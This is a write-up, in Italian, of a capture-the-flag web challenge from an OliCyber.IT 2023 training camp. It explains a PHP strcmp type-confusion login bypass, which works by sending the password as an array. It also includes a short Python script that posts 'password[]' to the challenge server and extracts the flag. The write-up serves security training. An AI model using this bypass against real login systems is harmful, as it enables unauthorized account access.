# OliCyber.IT 2023 - Simulazione training camp 1

## [web] L'ennesimo login bypass (28 risoluzioni)

Ci viene presentata una pagina web con un input per una password.

Guardando nella risposta del server e tra i cookie possiamo notare l'apparizione di `PHPSESSID`, quindi siamo davanti ad un applicativo PHP.

### Soluzione

Essendo un applicativo PHP possiamo provare le comuni tecniche di bypass.
Quella che funziona in questa situazione prevede di modificare il tipo della variabile password da stringa ad array, ciò si può fare sia modificando la richiesta tramite burp, sia modificando la proprietà `name` in `password[]` all'interno dell' HTML tramite gli strumenti da sviluppatore.

Questo bypass funziona in quanto la funzione `strcmp` ritorna 0 anche nel caso in cui ci sia un errore, come appunto quello di tipo in cui si passa un array al posto di una stringa.

### Exploit

```python
#!/bin/python3

import requests
import re

flag_regex = "flag{.*}"

url = "http://ennesimo_login_bypass.challs.olicyber.it/index.php"

r = requests.post(url, data={
    "password[]" : "randompassword"
})

flags = re.findall(flag_regex, r.text)

print(flags[0])
```
